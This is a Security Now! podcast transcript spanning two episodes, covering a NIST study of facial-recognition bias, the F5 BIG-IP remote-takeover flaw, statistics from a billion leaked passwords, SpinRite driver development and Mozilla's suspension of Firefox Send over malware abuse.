To evaluate the algorithms, the NIST team used four collections of photographs containing 18.27 million images of 8.49 million people.  All came from operational databases provided by the State Department, the Department of Homeland Security, and the FBI.  The team did not use any images scraped directly from internet sources such as social media or video surveillance.  The photos in the databases included metadata indicating the subject's age, sex, and either race or country of birth.  Not only did the team measure each algorithm's false positives and false negatives for both search types - that is, one-to-one and one-to-many - but it also determined how much these error rates varied among the tags, you know, the metadata.  In other words, how comparatively well did the algorithm perform on images of people from different groups?



Tests showed a wide range in accuracy across developers, with the most accurate algorithms producing many fewer errors.  In other words, there's highly accurate facial recognition and quite crappy facial recognition.  That's my term, not NIST's.  The study focused upon the performance of individual algorithms and was able to reach five broad findings.  First, for one-to-one matching, the team saw higher rates of false positives for Asian and African American faces relative to images of Caucasians.  The differentials often ranged from a factor of 10 to 100 times, depending upon the individual algorithm.  False positives might present a security concern to the system owner, as they may allow access to imposters.



Two, among U.S.-developed algorithms, there were similar high rates of false positives in one-to-one matching for Asians, African Americans, and native groups which include Native American, American Indian, Alaskan Indian and Pacific Islanders.  The American Indian demographic had the highest rates of false positives.



Three, however, a notable exception was for some algorithms developed in Asian countries.  There was no such dramatic difference in false positives in one-to-one matching between Asian and Caucasian faces for algorithms developed in Asia.



LEO:  Oh, isn't that interesting.  There you go.



STEVE:  What, Leo?



LEO:  That's interesting.  It shows it's the training data, probably, yeah.



STEVE:  Exactly.  Patrick Grother emphasized that the NIST study did not explore the relationship between cause and effect.  One possible connection, the area for research, is the relationship between an algorithm's performance and the data used to train it, exactly as you said, Leo.  He wrote:  "These results are an encouraging sign that more diverse training data may produce more equitable outcomes, should it be possible for developers to use such data."



The fourth conclusion:  For one-to-many matching, the team saw higher rates of false positives for African American females.  Differentials in false positives in one-to-many matching were particularly important because the consequences could include false accusations.  In this case, the test did not use the entire set of photos, but only one FBI database containing 1.6 million domestic mugshots.



And then their final conclusion:  Not all algorithms give this high rate of false positives across demographics in one-to-many matching, and those that are the most equitable also rank almost the most accurate.  This last point underscores one overall message of the report:  Different algorithms perform differently.  So I thought that was really interesting.  You know, there are 99 wannabes, and there are a bunch of crappy facial recognition solutions.  You know, maybe you get what you pay for.  Or the point is, you know, just the fact that something says, "Oh, yeah, we do AI, and we have facial recognition," doesn't mean that it's good AI or good facial recognition.



That tells us that not all facial recognition algorithms are created equally, nor do they treat everyone equally.  So that suggests that it's dangerous to lump all facial recognition into a single performance category or a single performance assumption.  It also means that, if at some future time we decide that the technology has improved to the point where it is no longer mostly a liability, any solution that is proposed will need to be carefully tested for bias.  And I can't imagine at this point  that that would not happen.  So I think that's been a very important lesson that's been learned.



F5 Networks learned an important lesson, or at least hopefully their users have.  Last Friday on July 3rd they released a patch for a super-critical vulnerability with a CVSS ranking of 10 out of 10.  All of their so-called "BIG-IP" - that's F5's designation, BIG-IP - networking devices running application security servers are vulnerable to remote takeover.  And, you know, F5 Networks is a big-iron company.  They're the real deal.  These BIG-IP devices are used in government networks, on public networks of Internet service providers, inside cloud computing datacenters, and they are widely deployed across enterprise networks.



The devices are so powerful and popular that on its website F5 claims that 48 of the 50 companies that are in the Fortune 50, which is to say 48 of the top 50 companies in the U.S., rely on their BIG-IP systems.  So these are also unfortunately big targets.  According to Mikhail - it's Russian, so it looks like Klyuchnikov, who is a security researcher at Positive Technologies who discovered the flaw and reported it responsibly to F5 Networks, the issue resides in a configuration utility called Traffic Management User Interface (TMUI) for BIG-IP Application Delivery Controller.



The Application Delivery Controller is used by large enterprises, datacenters, cloud computing environments, since it allows them to implement application acceleration, load balancing, rate shaping, SSL offloading, and a web application firewall.  In other words, it's the Internet-facing big-iron hardware that all of an organization's traffic will typically pass through.  And since one of the jobs is SSL offloading, that means that it's performing the TLS encryption.  It's the endpoint, and connections are decrypted inside on the non-Internet edge.  So that's where a bad guy would love to set up camp.



What we have learned is that an unauthenticated attacker can remotely exploit this vulnerability by sending a maliciously crafted HTTP request to the vulnerable server hosting this Traffic Management User Interface (TMUI) in this BIG-IP configuration.  And I'll say once again, never, never, never expose any sort of privilege requiring management interface to the public Internet.  Never, never, never.  Find some way not to do it.



Unfortunately, a Shodan search in one case revealed at least 8,500 major organizations and governments had not heeded that advice and were wide open to this remote exploitation at the time of its disclosure at the end of last week, last Friday.  And successful exploitation of this vulnerability could allow attackers to gain full admin control over the device, eventually allowing them to do anything they wanted to on the compromised device.



Klyuchnikov said:  "The attacker can create or delete files, disable services, intercept information, run arbitrary system commands and Java code, completely compromise the system, and pursue further targets, such as the internal network.  Remote code execution in this case results from security flaws in multiple components, such as one that allows directory traversal exploitation."  And as for where the devices are located, 40% of those reside in the U.S., 16% in China, 3% in Taiwan, 2.5% in Canada and Indonesia, and less than 1% in Russia.



So that was last Friday.  Apparently, security researchers were intrigued enough by the possibility of this exploitation to skip their Fourth of July holiday, if they were in the U.S., and instead spent the weekend developing and working out proof-of-concept exploits showing just how easily these devices could be exploited, because proof-of-concepts began appearing on the Internet by Sunday, two days later.  And the next day, the attacks began.  The cybersecurity community did expect that this bug would come under active attack quickly, as soon as attackers figured out how they could exploit it, because we're talking some big pots of gold.



One such researcher tweeted:  "The urgency of patching this cannot be understated."  He said:  "I worked for F5 for a decade.  They power cell carriers, banks, Fortune 500, and many governments.  If deployed correctly, the management interface should not be exposed to the Internet; but @binaryedgeio returns 14,000 hits for 'tmui' so YMMV," your mileage may vary.  And the NCC Group's security researcher, Rich Warren, who's currently operating BIG-IP honeypots, said he detected malicious attacks coming from five different IP addresses.



So this is a bad one.  And it's a great case in point.  Never, never, never expose management interfaces to the public Internet.  Make certain to have open lines of communication to the vendors of the critical devices you use so that you can and will receive notifications of critical vulnerabilities, and take action on them with all possible speed.  The game has changed  from the way it was a decade ago, which was are there any vulnerabilities?  Today it's who is quicker, the patcher or the exploiter?  And you'd rather be the former than have the latter, the exploiter, get you.



One little bit of miscellany.  And I actually meant to talk to you about this offline, Leo, but I just thought I would mention that I said goodbye to YouTube TV last week.



LEO:  Oh, man.  This pisses me off.



STEVE:  Doesn't it, really?  It does to me, too.  It was nice, but that is just too big a jump.  I don't want any of the new channels that they offer.  I mean, what's annoying is nothing has ever made an a la carte environment more possible than the Internet.  But that's not what's developing.  Anyway, I jumped to Sling.  They have the few channels that I care about, and I added the $5, 50-hour DVR.  So I'm now at 35 bucks a month, and I've got as much as...



LEO:  I'll do the same, yeah.  It's 65 now for YouTube TV.  It was up from, what, 35, then 40, then 50, and 65.  And they just kept going.  And I fully don't blame YouTube or Google for this because basically what they didn't think of is they invented a cable channel.  And they're now prone to the same problems cable channels have, which is that the channels they want to carry are raising their costs, and so they have to pass them along.  Sling has promised they won't raise prices for a year, which I think is interesting.  I don't know how they're going to do that.  But you get all the channels you want.  I'm going to have to look at this, yeah.  Yeah, okay. 



STEVE:  It had everything that I care about, which I was glad for. 



LEO:  And you get DVR for a little more, 35 bucks a month; right? 



STEVE:  Exactly.  $5 on top of 30, and that gives you 50 hours, and that's way more than I need.



LEO:  Oh, you get 10 anyway.



STEVE:  Yes, exactly.  You get - is it 10?  Yeah, 10 with the base package.  But there were a bunch of shows that I just liked to have and then do the fast-forward routine.



LEO:  Right.  I'll be interesting to see what happens even to these guys.



STEVE:  Yeah.



LEO:  It's funny because we had this dream of disaggregation, of buy just what you wanted and just either the channel or even the shows you wanted.  And I think this was the over-the-top dream for these Internet providers.  But basically all they've done is reinvent the cable industry.



STEVE:  And is it the content providers that will not allow these things to be broken apart?



LEO:  No, well, oh, that's interesting.  Yeah, no, no, because for instance many of these content providers are selling themselves individually - HBO, ESPN.  There's lots you can get by themselves.  But they're prohibitively expensive.



STEVE:  Right.



LEO:  The bundle is the only - unless - yeah.  It's funny.  It's a cycle, I think.  And I don't know what the answer is except just watch YouTube a lot.  Not TV, but YouTube.



STEVE:  I imagine that Google received a message they were probably anticipating.  I mean, I immediately said no.



LEO:  Oh, I'm sure they didn't want to do this.  That's the point.  But I don't know if they had a whole lot of choice.  I think they had to pass those costs along.  I don't think it was their desire to do this.



Does either one of these Hulu, I mean, sorry, Sling channels have Turner?  Because I really like the Turner Network, TCM, Turner Classic Movies.  Good old movies.



STEVE:  Good question.  I think, yes, I think Sling TV does happen to have TCM.



LEO:  Oh, it has TCM.



STEVE:  Or TMC, whatever it is.



LEO:  Yeah, yeah.  They have the news channels, which is really the main thing I have this for.



STEVE:  Yes, and that's what I first looked at.



LEO:  You know what they don't have, they don't have the locals.  That's the big difference.



STEVE:  They have NBC and Fox, depending upon where you're located.  



LEO:  Because YouTube TV offers all the locals in every market.



STEVE:  And I already get CBS All Access.  Yeah.



LEO:  That's a big difference.



STEVE:  Yeah.



LEO:  Sigh.



STEVE:  So two pieces of closing-the-loop feedback.  Kevin Morris tweeted:  "Hi, Steve.  I've been experimenting with various flavors of Linux, and once I burned an ISO to my flash drive, I always had a devil of a time being able to use it again.  InitDisk solved the problem.  Thank you for that."  Kevin Morris, Santa Clara, California.



LEO:  Nice. 



STEVE:  Kevin, thank you for noting it.



LEO:  That's your new little freebie that you're...



STEVE:  Yup, my first little spinout or spinoff from the SpinRite work.  And someone who's abbreviated Inspector Clouseau, he sent:  "I just found out about this.  Thinkst has an open source version of its Canary which runs on a Raspberry Pi.  I'm trying to install it now."  And it turns out they do.  They're on GitHub.  Thinkst is on GitHub. 



LEO:  That's awesome.



STEVE:  And Thinkst has OpenCanary.  And they said:  "OpenCanary is a daemon that runs several canary versions of services that alerts when a service is abused."  Prerequisite is Python 2.7 or 3.6.  Then they say:  Optional.  SNMP requires the Python library scapy.  RDP requires the Python library rdpy.  And the Samba module needs a working installation of Samba.  So it's there, and you can definitely set up things to look like a Windows server and to look like a number of different things.  There's a bunch of stuff there.  So I just thought - oh, and also OpenCanary.org is sort of the main entry page.  So, you know, very cool...



LEO:  Awesome.  I had no idea.  That's great. 



STEVE:  ...that Thinkst is also open.  And we should disclaim that they are also a sponsor on the network.



LEO:  Absolutely.  Much beloved.



STEVE:  And I had an interesting experience in the last week that I thought our listeners would find interesting.  In my development of an AHCI driver for SpinRite, as we know, the next release of SpinRite will be bypassing the BIOS and bringing its own maximum performance mass storage device drivers to bear.  With all of our AHCI testers earlier last week reporting initial success with the driver seeing their drives, a couple of days ago I implemented its first use of bulk data transfer, which SpinRite will be using.  It transfers maximum size 32MB blocks of 65,536 sectors.  That's the maximum.  The larger format drives support what's known as 48-bit LBA, Linear Block Addressing.  And there you're able to use a word, a 16-bit word for the sector count, zero meaning, since it doesn't make any sense to transfer zero sectors, zero means 65,536, which would otherwise overflow a 16-bit register.  So that's 32MB.  So I'm transferring maximum size 32MB blocks.



For the initial benchmarking test I wanted to measure the time required to transfer 1GB of data.  So that's 32 of these 32MB blocks.  So I would initiate a transfer with the AHCI controller, wait for it to issue a hardware interrupt, signaling its completion of that block, then immediately initiate the next transfer.  That code worked right off the bat.  Which always makes me a little suspicious when something really complex just works the first time.



LEO:  Shouldn't be that easy, yeah.



STEVE:  What?  Really?  Okay.  Anyway, so I posted it for the gang in the newsgroup to test.  And right away we began noticing that the numbers weren't really making sense.  They looked lower than they should be, especially - this was especially obvious for the faster devices such as SSDs.  Then one of our testers, whose name is MIL-Q, that's his handle, he switched his system from AHCI mode back to IDE mode, and he ran the earlier benchmark that I had completed back in 2013 before I interrupted this work to work on SQRL.  That benchmark definitely maxed out his drive and his SATA link.  He was getting something like 500 and, I don't remember now, 500 and some megabytes per second because the maximum theoretical SATA III speed is 600MB per second.  That's the most you can get.  He was, like, up near there.



So that benchmark, when his computer was switched into IDE mode, was doing exactly the same thing - initiating a transfer, waiting for a completion hardware interrupt, then starting the next transfer.  But it was not using the super-fancy AHCI controller.  In IDE, which is also sometimes referred to as "compatibility mode" in the BIOS, it was bypassing the AHCI controller's features and performing what's known as "bus mastering" DMA.  And that's what was blazing.



So I turned my attention back to the AHCI solution.  The first thing I did was to try timing the transfer of just one single 32MB block.  Now, that's problematic for a benchmark due to device caching.  A 1GB transfer is guaranteed to bust out of any cache and not be cached.  But 32MB might be.  But I was doing all this work with an SSD anyway, so that didn't matter.  What I found doing just one transfer was I was seeing much higher calculated byte transfer rates.  That suggested that the trouble was inter-transfer overhead, the time being taken from the end of one block to initiating the next one.  And this fit the symptoms since it was the faster devices, the SSDs, where we seemed to be returning values that were the most off.  That would make sense because the inter-block interval would be consuming a larger percentage of the whole when the transfers themselves were super short.



So the next thing I did was to transfer only one block, but to also eliminate the interrupt service overhead by doing what's known as "spinning" on the AHCI controller's completion status.  Rather than halting the thread and waiting for a hardware interrupt to reawaken me, I "spun," that is, I just ran a tight loop doing nothing but polling the completion status bit of the AHCI controller.  That way, the instant it flipped to "done," I would stop the timer and calculate the time that had been spent and thus the effective byte transfer rate.  And sure enough, once again I got a better result.



So then I switched back to a multi-block transfer, still using the interrupt-free spin loop, and got the best results I'd seen so far.  But I was still not getting the performance that I was getting if I switched back to much simpler IDE Bus Mastering.  And of course now I understand why.  When using IDE and Bus Mastering, you are directly talking to the drive, and you have the minimum overhead possible.  The AHCI controller is a little bit of a misnomer for people thinking that it is like some dramatic advance on technology.  It itself, it is incredibly complex.  That tells us that it is not implemented in hardware.  It is a microcontroller.  So it is executing microcode, which means it's going to be a little slow.  It's going to have some overhead of its own that talking directly to the drive hardware doesn't.



What that means is that where the AHCI controller comes into its own is when you are doing much more at once, when you have a really busy system with lots of hard drives and lots of work being done.  However, the AHCI controller allows you to queue up work.  And that's the key to getting the most performance.  For example, even when talking to one drive, I'm able to queue up 32 pieces of work.  That is, I could queue up the entire 32-block transfer at once, and it would run the entire block without generating a single interrupt.  And the moment the drive signified that it was done, it would start on the next block from the controller.



I can go one step better, though, and use something known as NCQ, Native Command Queuing.  With Native Command Queuing, you actually put the work in the drive.  While the drive is transferring, you're able to give it the next pieces of work that you wanted to do, allowing it to have the work and just basically stream these things into the system.  So anyway, I reworked the code.  I've done that first part where I am putting multiple pieces of work in the AHCI controller.  My brief look at it, I had to pause the work in order to do this podcast, but it looked like I was achieving what I had.  So I'll just touch in on this next week and let everyone know how we're doing.  But there's a little snapshot into the fun we're having over in the SpinRite dev newsgroup.



LEO:  It's nice to have that group, to have some people to bounce the stuff off of. 



STEVE:  It's invaluable to me.  I just - I can't imagine doing this without having a bunch of interested people who are pounding on this with all their hardware.



LEO:  Have you had that before?



STEVE:  Yeah.  SQRL was done that way.



LEO:  Well, I know SQRL, yeah.



STEVE:  SpinRite was done, the original work on SpinRite was done that way.



LEO:  Was it.



STEVE:  I've been doing this from the beginning.  It's just - it's too useful.  And in fact the reason I'm releasing a benchmark is to hope that our listeners, the listeners of this podcast, because I'm not going to drag everybody over into the NNTP textual newsgroups, I've got GRC Forums ready to go.  I want to release this as a benchmark so that I can get all of our listeners to give this a test.  I mean, people are really interested to see what performance they're getting from this or that drive.  It's just, you know, benchmarks are fun.  And so we will have public web forums.  Mostly it will allow me to learn of additional problems that I haven't found so that I can fix those, and then all of this technology moves from being the platform for the benchmark into the new platform for SpinRite.



LEO:  Very cool.  How exciting.  So people just go to GRC.com/forums, and they can join up there and all that?



STEVE:  Forums.grc.com.  Not yet open, but it will be.



LEO:  It will be.  Okay, cool.



STEVE:  Yup.  So Leo?



LEO:  Yes?



STEVE:  What is 123456?



LEO:  It is the most...



STEVE:  It's not a Fibonacci sequence.



LEO:  No, we know that much.



STEVE:  That would be 112358.



LEO:  Yes.



STEVE:  It's not a linear regression.



LEO:  No.



STEVE:  But it is a linear transgression.



LEO:  Yes, it is.



STEVE:  Because believe it or not, still, in this day and age, 123456 turns out to comprise one out of every 142 passwords.



LEO:  That's crazy.



STEVE:  Found on the Internet.



LEO:  Oh, my god, that's crazy.



STEVE:  In one of the largest password reuse studies of its kind, the password 123456 was found to occur seven million times across a massive data trove containing one billion leaked credentials.



LEO:  Wow.



STEVE:  As we know, the number of leaked credential database collections continues to grow as new companies continue to get hacked, and their databases get exfiltrated.  And they are eventually made available online at GitHub or GitLab or  distributed on hacking forums and file-sharing portals.  And some good use is being made of them.  Responsible tech companies like Google, Microsoft, and Apple have collected leaked credentials to create in-house alert systems that warn users when they are utilizing a weak or a common password.  And of course we know Troy Hunt, his famous HaveIBeenPwned online service relies upon submissions of these leaked credential databases.



So last month a Turkish student studying at a university in Cyprus decided to download and analyze more than one billion of these leaked credentials.  And what's very cool is his work is up on GitHub for anybody who wants real detail.  His primary discovery was that the one billion-plus credential database contained a startlingly high count of duplicates.  Or stated another way, among the more than one billion passwords, only 168.9 million were unique.  And of those nearly 169 million unique passwords, more than seven million of them were 123456.



LEO:  Wow.



STEVE:  So that means that one out of every 142 passwords included in the analyzed sample was the number one weakest password known today.  Additionally, his research also revealed that the average password length is 9.48 characters, so just shy under 9.5 characters.  And that's not great, but at least it's not six, as is 123456.  Since I invariably use LastPass to synthesize my own passwords, I typically have mine set to 32.  And then I'll reduce it as required when some brain-dead website sets a lower upper limit and complains, then I have to crank it down to 20 or something.  But still.



So this Turkish researcher also observed that password complexity was another problem.  Only, get this, 12%, one in eight, of the passwords contained any special character.  Now, while that's not good for them, that's great news for us, since the bad guys who are attempting to brute force our credentials also know this.  They will certainly expend all of their time not bothering to brute force special characters because they know the chances, what is it, 92%, no, 88% chance that the password does not have any special characters.  That's what they're going to do.  They're not going to bother with the 12%.  But that's all of us; right?  So we use special characters, and so we're not brute forced because the bad guys are not going to bother with that because the chance of finding somebody with a special character is vanishingly small.  So special characters for us, yay.



Okay, what else?  Most of the passwords, 29% of them, used only letters; or 13% only numbers.  The full research I've got up on GitHub, or he has up on GitHub, a link in the show notes for anyone who's interested.  But we have some nice bullet point takeaways.  From one billion-plus lines of dumps, he filtered out 257.669 million as the data was corrupt, improper format, or test accounts.  So that one billion credentials boiled down to, as I said, just shy of 169 million unique passwords, and 393 million unique usernames.  And of course, as we titled this podcast, the most common password was 123456, covering roughly 0.722% of all passwords.  That's seven million times in that one billion set.



The top thousand recurring passwords, the top thousand, okay, so the thousand most recurring passwords represented 6.6% of all passwords.  Which is interesting because that means that checking, for a brute forcer, checking those top thousand, you would have a 6% chance of it being one of those top thousand.  With the most common one million passwords, the hit rate against the whole collection is 36%.  So that was the first - so the top thousand was 6.6%.  If you expand it to the most common one million, the hit rate against the whole collection goes up to 36%, so better than a third chance, if your guess is the top one million.  And with the top most common 10 million passwords, the success rate is 54%, meaning that if you were a brute forcer, and you made a dictionary of the top 10 million passwords, which is not that big a deal, you stand a better than 50-50 chance of cracking someone's password.



So anyway, surprising numbers.  The average password length, we said, just shy of 9.5, 9.42 characters long.  Only 12% contain any special characters, as I mentioned, so 88% of those don't.  So we're happy to be using special characters.  28.79 are letters only.  26% of the passwords are lowercase only.  Nobody bothered to hit the shift key.  13.37, numbers only.  And this is interesting.  34.41% of all passwords end with digits, but only 4.5% of all passwords start with digits.  So start your password with a digit, folks.  The bad guys know these numbers.  They have the stats.  They won't be trying that. 



And, finally, in an observation that constitutes a real contribution, this researcher noticed and then researched an unsuspected pattern in the data.  He wrote, and I've actually fixed the grammar and made it a little more clear, but essentially he wrote:  "During my research, I've noticed a handful of apparently high-entropy passwords" - meaning all 10 characters, upper and lowercase, and digits - "that were being reused.  These passwords had a very low occurrence rate, but far more than one would expect.  Specifically, they all start and end with uppercase characters.  None of them seem to have a keyboard pattern or meaningful word in them.  They are all 10 characters long.  They don't contain special characters.  Some of them occurred up to one per 100 million credentials," he said, "meaning I have around 10 reuses of them currently."



And he said:  "The most recent occurrence for these, 86 of these were found in a set of 55,623 credentials from a leak in June of 2020."  So a very recent leak, last month, 86 of those.  He found 763,000 passwords matching this pattern.  And he concluded by observing:  "I have no idea what this uncovers and what it implies.  But I'm suspecting a password manager out there is creating passwords with low entropy, causing repetitions over a lot of users.  All the ideas about this are welcome and appreciated."



And I would draw the same conclusion.  I think that's really interesting.  We know that there's widespread reuse of password managers.  There may be one which does not have a very good entropy source.  And as a consequence, without them knowing it, users are generating duplicate passwords, either with their own use and reuse of this, or among all the users of this.  So I thought that was a really interesting finding and some interesting stats on passwords.  Our takeaway is, begin your password with a number, use a special character, and you will just be off the brute forcers' radar.



LEO:  Very good.  It's nice to know.  Although I wouldn't tell everybody how long your normal password is.  Now we know.  We start at 32 characters.



STEVE:  Well.



LEO:  And they're more than welcome to try to brute force 32 characters.



STEVE:  Absolutely.



LEO:  I never use, if a site says it has to be 12 or less, 12 or fewer, I always do 11 or nine or something because then that's a different situation because that's a big pool of customers who probably are using 12.  So, yup.  You've got to wonder where you could use 123456 these days.



STEVE:  Boy.  I mean, the browser itself will break out into laughter.



LEO:  Yeah, I know.  Probably influenced, I don't know what the dataset was for this Turkish researcher, but probably influenced quite a bit by the stuff that he had in there.  You know, it's not massive.  Or maybe it is.  I don't know.



STEVE:  Well, it's more than a billion.



LEO:  Yeah.



STEVE:  That's a lot of credentials.



LEO:  Yeah, yeah, yeah.  It's probably all Yahoo users, see.  That's the problem.  Right?  You know.  That's Steve Gibson.  He is not a Yahoo user.  I can guarantee you that.



STEVE:  No, sir.



LEO:  No, sir.  Not AOL.  Don't email gibson@aol.com.  Nothing's going to come back.  In fact, don't email him at all.  Best thing to do is follow him on Twitter, @SGgrc.  He puts his show notes up there early for me, but you can also partake.



STEVE:  Back then it was for Elaine.



LEO:  More for Elaine than anybody else.  Okay.  That's what Elaine uses.  Elaine does these great transcriptions, by the way.  This is the only show that is regularly transcribed by a human being, which is awesome.  And you can get those transcriptions along with the 16Kb versions of the audio and 64Kb versions at Steve's site, GRC.com.



While you're there, you've got to check out SpinRite, the world's best hard drive recovery and maintenance utility.  And now would be a good time to pick up SpinRite 6 because you'll get a copy free of 6.1 when the upgrade comes out.  Plus you'll be part of all the beta testing, and you can see it starting to get really, really interesting.  GRC.com.  Lots of other great stuff there, freebies and so forth.



We have audio and video at our website, TWiT.tv/sn.  We also have on-demand versions.  All you have to do is go to your favorite podcast application and subscribe.  That way you'll get it the minute it's available of a Tuesday evening, maybe Wednesday morning, maybe, depending on your time zone.  We do the show in California time, so roughly 1:30 p.m. Pacific.  This time it was a little later, so it varies.  But around, starts no earlier than 1:30 p.m. Pacific.  That's 4:30 Eastern time.  That's 20:30 UTC.  Adjust accordingly for your time zone.  And then fire up the browser and head to TWiT.tv/live.  That's where you'll find live audio and video streams you can listen to.  And they're going all day, all night.  Sometimes it's new content, like it is on Tuesday afternoons; but sometimes it's rerun content.  But there's always something great to listen to there.



If you're doing that, join the chatroom.  They're listening to that live stream and talking back to it.  It's funny because I'll go sometimes to irc.twit.tv, actually I have it running all the time at home, and every once in a while I'll be home, you know, eating breakfast, and see somebody talking back to me because the show that's running was a show I did the day before.  And sometimes I'll answer, which will really confuse people.  But I thought this was a rerun?  Anyway, there's lots of great people.  If you're getting a little lonely during quarantine, the chatroom is a great place to hang out:  irc.twit.tv.



For people who listen on demand, we also have a forum, just like Steve's forums.  Ours are at twit.community.  That's the website, twit.community.  It's a great place to hang out, talk about shows, feed back to the shows.  But as I said, the best way to feed back to Steve is either GRC.com/feedback or on his Twitter account because he takes DMs from anybody.  He's crazy that way.  So @SGgrc is his Twitter handle.



Steve, we will reconvene next week for another fabulous edition of Security Now!.  I'll see you then.



STEVE:  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#775

DATE:		July 14, 2020

TITLE:		Tsunami

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-775.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at Mozilla's surprise suspension of their Firefox Send service, Zoom's latest remote code exploit vulnerability, the latest revision of the U.S. Congress's EARN IT Act legislation, the growing tension with stalkerware apps, a Chinese Internet equipment vendor in the hot seat, the challenge of geolocating illegal drone operators, Fraunhofer's report of rampant router vulnerabilities, and SpinRite's move toward increased political correctness.  Then we wrap up by looking at Tsunami, Google's latest and extremely useful-looking contribution to the open source community. 



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Yet another Chinese Internet equipment manufacturer showing some vulnerabilities, or maybe they're intentional.  We'll tell you why you shouldn't worry too much about that recent Fraunhofer report on vulnerabilities in Internet routers.  And then it's a look at a new Google vulnerability scanning tool they're giving away.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 775, recorded Tuesday, July 14th, 2020:  Tsunami.



It's time for Security Now!, the show where we cover the latest news about security, how things work, how to keep yourself safe with this cat right here, our security guru, Steve Gibson from GRC.com.  Steve?



STEVE GIBSON:  Also known as Steverino, or this cat. 



LEO:  This cat right here, man.



STEVE:  Or the best we can do on any given week.



LEO:  No, that's not true.  It is the best we can do, yes.



STEVE:  So we have Episode 775 titled "Tsunami," after Google's latest and extremely useful-looking contribution to the open source community.  So we're going to wrap up talking about that.  I think that will probably be of interest to a lot of our listeners, especially in larger enterprises, which is what it's aimed at.  But we've got a bunch of stuff to talk about.



We're going to look at Mozilla's surprise suspension of their Firefox Send service; Zoom's latest remote code exploit vulnerability; the latest revision of the U.S. Congress's EARN IT Act legislation still working its way; the growing tension with stalkerware apps; a Chinese Internet equipment vendor in the hot seat; the challenge of geolocating illegal drone operators; Fraunhofer's report of rampant router vulnerabilities; and also, sort of on a lighter note, SpinRite's move toward increasing political correctness for itself.  And then we're going to wrap up, as I mentioned, by looking at Tsunami, which looks like another really useful contribution from Google.  So a bunch of fun stuff to talk about this week.



LEO:  Cool, very cool.  I'm sad to hear about Firefox Send.



STEVE:  Well, it's going to be back.  But it's interesting what happened to it, and that's really where the story is.  So, yeah, be talking about that.



LEO:  Steve?



STEVE:  And lest we forget the Picture of the Week, thank you somebody on Twitter for sending this to me.  It's just kind of fun.  I'm not sure what country this is where they have...  



LEO:  Looks like a college campus, actually.  I bet you that's what it is.



STEVE:  Oh.  That does look kind of like Harvard in the background maybe.  



LEO:  Yeah, yeah.  And it's - or Colorado because I see the snow stick attached to the fire hydrant.



STEVE:  I was thinking that was a snow stick, yes, exactly.  Although it's not on - I thought snow sticks were normally along the side of the road; right?  This looks like it's marking...



LEO:  Well, it's on the path.  You also need to know where the hydrant is if it's buried in the snow.



STEVE:  Like a sidewalk.  Anyway...



LEO:  You may be able to find the hydrant, but don't try to use the emergency phone.



STEVE:  So there's a phone stuck over, looks like an empty hole in this kind of very modern-looking structure.  And it just says, as if you wouldn't know, says "Emergency phone not installed."  And then the lower half of the note:  "Please do not have an emergency at this location."  



LEO:  Definitely campus humor.  Definitely.



STEVE:  Yeah.  That does seem apropos.



LEO:  Yeah, yeah.



STEVE:  So if someone were to go to send.firefox.com at the moment, they would be greeted by the little screenshot that I have at the top of the security news of our show notes, which reads, "Firefox Send is temporarily unavailable while we work on product improvements.  We appreciate your patience while we make the Firefox Send experience better."  And Leo, I think you did just go there, didn't you.



LEO:  I did, yes.



STEVE:  And there it is.



LEO:  That's too bad because I really love Firefox Send.  It's such a good idea.



STEVE:  Oh, it's my go-to, yes, it's become my go-to file sharing service.  The good news, it'll be back.  The bad news is why it went away.  Just to remind our listeners, we've talked about it before.  It allows files of up to 1GB if you're not signed in, or 2.5GB if you are, to be locally encrypted in the browser, optionally password protected so that only the recipient is able to retrieve and decrypt a sent file.  You get retention controls allowing the sender to set the time, that is, the duration and/or a download count, after which that content will expire from the Firefox Send cloud and be removed.



Unfortunately, as with anything that is simple, free, and effective, like think email, it's also subject to abuse by nefarious forces.  The bad guys also love Firefox Send because it lets them generate short-term links based on good-looking trusted domains for sharing arbitrary evilware to unwitting victims.  So thanks to Firefox Send, the bad guys don't need to set up their own file sharing server and try to get a legitimate-looking URL domain.  They don't have to worry about making sure that URLs expire automatically.  Mozilla does that for them.  And links that only work once create an extra challenge for security researchers because, even if the malicious URL is captured in a log, by then it's probably been used.  So it's not possible to go back and obtain the original because it's been removed already.  And of course, since the IP is one of Mozilla's servers, it's not one that anyone wants to just put a blanket block on.  And I was going to say they wouldn't want to blacklist it, but I'm working to be better.



Over the past few months, Firefox Send, it turns out, has been used increasingly to store payloads for all sorts of cybercrime  operations, from ransomware through financial crime, banking trojans, spyware, and used to target human rights defenders.  FIN7; REvil, also known as Sodinokibi; Ursnif, which is also the Dreambot network; and ZLoader are just some of the malware gangs and strains that have been seen hosting payloads using Firefox Send.



As a consequence, the cybersecurity industry has finally tipped its collective hat to Mozilla for suspending what has become a widely used and unfortunately now widely abused service.  Mozilla didn't just say, oh, you know, we recognize there's a problem.  We'll be considering some changes in the future.  They just shut it down.  They said, okay, we're just going to stop making this available until we can upgrade it.



Cybersecurity researchers have suggested various changes to strengthen the service.  One is to add a Report Abuse button so that flagging or killing malicious links could be made much more quick and easy.  What Mozilla said in their statement about this, they said:  "Before relaunching, we will be adding an abuse reporting mechanism to augment the existing Feedback form, and we will require all users wishing to share content using Firefox Send to sign in with a Firefox Account."



So it's sad that once again we see the Internet's inherent anonymity being abused and then having to be restricted.  It was cool to be able to send up to 1GB with a 24-hour expiration without needing an account with Mozilla, even though I have one.  But just as Zoom was forced to limit what they would allow to be done with full anonymity, so too now has Mozilla.  And as we know, even requiring an account is not a very high bar.  And my sense is it's not going to be very effective, but at least it will help a bit.  And it will help Mozilla to say, hey, you know, we've done all we can.  We're doing all that we can do.



But, you know, in light of all this, of everything we see going around us, I will make a prediction that in some future - not tomorrow, not even soon, maybe not during our lifetime.  But I'll bet that some set of abuse-prone services, maybe anything that generates rather than consumes content, will end up requiring some form of affirmative, probably government-issued, verifiable identity.  In that possible, and I would argue probable eventual future, it will be permissible to browse and read and consume content anonymously.  But any public content will probably be traceable back to its source.  We know we're not there today, and it won't happen soon.  But I'll bet it happens eventually.



